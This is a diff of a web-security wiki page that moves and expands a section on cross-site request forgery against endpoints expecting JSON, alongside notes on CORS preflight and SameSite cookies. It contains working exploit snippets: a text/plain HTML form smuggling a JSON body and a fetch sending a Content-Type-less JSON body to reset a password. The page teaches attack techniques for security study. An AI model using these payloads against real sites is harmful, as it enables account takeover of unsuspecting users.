@@ -67,9 +67,70 @@ If the application responds with `Access-Control-Allow-Origin: null` by default,
 </script>
 ```
 
+### Preflight & Content Types
+
+With `fetch()` requests (not forms), you can send very complex requests with custom headers and methods. Because these can be dangerous if authenticated by cookies, the browser will only allow sending [simple requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) cross-origin. Any more complex requests will first send a _Preflight_ request that asks the server what is allowed, and then decide on if the real request will be allowed or not.
+
+You cannot, for example, add a `Content-Type: application/json` header to your request, or send a `PUT` method. You need to either find a "simple" alternative that is also accepted by the server, or be allowed via the preflight check.
+
+One common problem is the server requiring a `Content-Type: application/json` body as a request to your sensitive endpoint. Exploiting this is non-trivial, but there are some edge cases where it is possible:
+
+1. The server can also parse `Content-Type: application/x-www-form-urlencoded` data, and you can transform the JSON into such fields. Potentially creating arrays with duplicate parameters or `param[]=`, and creating objects with `obj[key]=value` syntax.
+2. The server accepts `Content-Type: text/plain` with a JSON body, which can be created in a form like this:
+
+{% code title="Exploit HTML" overflow="wrap" %}
+```html
+<form id=form action="https://example.com/reset_password" method="POST" enctype="text/plain">
+  <input type="text" name='{"password":"hacked","dummy":"' value='"}'>
+</form>
+<script>form.submit();</script>
+```
+{% endcode %}
+
+By putting arbitrary JSON data in the name/value, we can make the mandatory `=` separator part of a dummy string. To the server, this may look like a valid body and it even works with a top-level context.
+
+<pre class="language-http" data-title="Request"><code class="lang-http">POST /reset_password HTTP/1.1
+Host: example.com
+<strong>Content-Type: text/plain
+</strong>
+{"password":"hacked","dummy":"="}
+</code></pre>
+
+3. The server accepts _missing Content-Type_ with a JSON body ([source](https://nastystereo.com/security/cross-site-post-without-content-type.html)):
+
+{% code title="Exploit JavaScript" %}
+```javascript
+fetch("https://example.com/reset_password", {
+  method: "POST",
+  body: new Blob(['{"password":"hacked"}'])
+});
+```
+{% endcode %}
+
+This will send a request without a `Content-Type:` header. The server might then default to JSON and successfully parse your body:
+
+{% code title="Request" %}
+```http
+POST /reset_password HTTP/1.1
+Host: example.com
+
+{"password":"hacked"}
+```
+{% endcode %}
+
+4. Confuse the parser with a charset that looks like the JSON content type. Using `fetch()` it is possible to add a `;charset=` to the `Content-Type` header with very lax parsing. Read the research below for details:
+
+{% embed url="https://github.com/BlackFan/content-type-research" %}
+Research into Content Types, including ways to confuse x-www-form-urlencoded data for JSON
+{% endembed %}
+
+{% hint style="info" %}
+**Tip**: If you are missing cookies even though `SameSite=None`, it's likely the result of [#third-party-cookie-protections](cross-site-request-forgery-csrf.md#third-party-cookie-protections "mention"). Try opening your target in a window from your site first to bypass it.
+{% endhint %}
+
 ## Same-site
 
-A different feature that uses the **same-site** policy is **Cookies**. On many websites cookies are everything that authenticates the user. If a request includes the session cookie of a user, they are allowed to perform actions on their account. Simple as that.\
+A different feature that uses the **same-site** policy is **Cookies**. On many websites cookies are all that authenticates the user. If a request includes the session cookie of a user, they are allowed to perform actions on their account. Simple as that.\
 To make sure malicious websites cannot simply recreate a `<form>` and send it automatically to change a password, for example, these requests are checked to be _same-site_ (see table above). If the origins are not same-site the cookies will not be sent.&#x20;
 
 In the early web days, this `SameSite` did not exist for cookies. Nowadays it is an attribute on cookies that may be `None` (no protections), `Lax` (default, some protections) or `Strict` (most protections).&#x20;
@@ -82,7 +143,7 @@ All `SameSite=` values have the following meanings:
 2. `SameSite=`<mark style="color:blue;">**`Lax`**</mark>: _Only_ top-level GET requests will contain the cookie. Any other requests such as POST, `<iframe>`'s, `fetch()` or other background requests will not include this cookie.
 3. `SameSite=`<mark style="color:green;">**`Strict`**</mark>: _No_ cross-site requests will include cookies. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie. A redirect is not sufficient here, as the origin at the time of redirection is still yours instead of the target.
 4. `SameSite` is <mark style="color:yellow;">**missing**</mark>: When the attribute is not explicitly set for a cookie, it gets a little complicated because the browser tries to be backward compatible. For _Firefox_, the value will be **None** by default, with no restrictions. For _Chromium_, however, the value will be **Lax\*** by default. \
-   \* This asterisk is saying that for the first 2 minutes of the cookie being set, it will be sent on cross-site top-level POST requests, in contrast to the normal Lax behaviour. After this 2-minute window, the behaviour mimics Lax completely, disallowing cross-site top-level POST requests again.&#x20;
+   \* This asterisk is saying that for the first 2 minutes of the cookie being set, it will be sent on cross-site top-level POST requests, in contrast to the normal Lax behavior. After this 2-minute window, the behavior mimics Lax completely, disallowing cross-site top-level POST requests again.
 
 ### Third-party cookie protections
 
@@ -239,63 +300,6 @@ In some more complex chains, you may want to initiate multiple CSRF requests tha
    The trick is that you can cancel the navigation quickly after it is started using `window.stop()` or by initiating a different navigation. You will still be on the attacker's page if the browser hasn't received a response yet. \
    The following gist contains reusable proof of concepts for this technique:\
    [https://gist.github.com/JorianWoltjer/b9163fe616319db8fe570b4ef9c02291](https://gist.github.com/JorianWoltjer/b9163fe616319db8fe570b4ef9c02291)
-
-### Content Types
-
-One common problem is the server requiring a `Content-Type: application/json` body as a request to your sensitive endpoint. Exploiting this is non-trivial, but there are some edge cases where it is possible:
-
-1. The server can also parse `Content-Type: application/x-www-form-urlencoded` data, and you can transform the JSON into such fields. Potentially creating arrays with duplicate parameters or `param[]=`, and creating objects with `obj[key]=value` syntax.
-2. The server accepts `Content-Type: text/plain` with a JSON body, which can be created in a form like this:
-
-{% code title="Exploit HTML" overflow="wrap" %}
-```html
-<form id=form action="https://example.com/reset_password" method="POST" enctype="text/plain">
-  <input type="text" name='{"password":"hacked","dummy":"' value='"}'>
-</form>
-<script>form.submit();</script>
-```
-{% endcode %}
-
-By putting arbitrary JSON data in the name/value, we can make the mandatory `=` separator part of a dummy string. To the server, this may look like a valid body and it even works with a top-level context.
-
-<pre class="language-http" data-title="Request"><code class="lang-http">POST /reset_password HTTP/1.1
-Host: example.com
-<strong>Content-Type: text/plain
-</strong>
-{"password":"hacked","dummy":"="}
-</code></pre>
-
-3. The server accepts _missing Content-Type_ with a JSON body ([source](https://nastystereo.com/security/cross-site-post-without-content-type.html)):
-
-{% code title="Exploit JavaScript" %}
-```javascript
-fetch("https://example.com/reset_password", {
-  method: "POST",
-  body: new Blob(['{"password":"hacked"}'])
-});
-```
-{% endcode %}
-
-This will send a request without a `Content-Type:` header. The server might then default to JSON and successfully parse your body:
-
-{% code title="Request" %}
-```http
-POST /reset_password HTTP/1.1
-Host: example.com
-
-{"password":"hacked"}
-```
-{% endcode %}
-
-4. Confuse the parser with a charset that looks like the JSON content type. Using `fetch()` it is possible to add a `;charset=` to the `Content-Type` header with very lax parsing. Read the research below for details:
-
-{% embed url="https://github.com/BlackFan/content-type-research" %}
-Research into Content Types, including ways to confuse x-www-form-urlencoded data for JSON
-{% endembed %}
-
-{% hint style="info" %}
-**Tip**: If you are missing cookies even though `SameSite=None`, it's likely the result of [#third-party-cookie-protections](cross-site-request-forgery-csrf.md#third-party-cookie-protections "mention"). Try opening your target in a window from your site first to bypass it.
-{% endhint %}
 
 ### Cookie Tossing
 
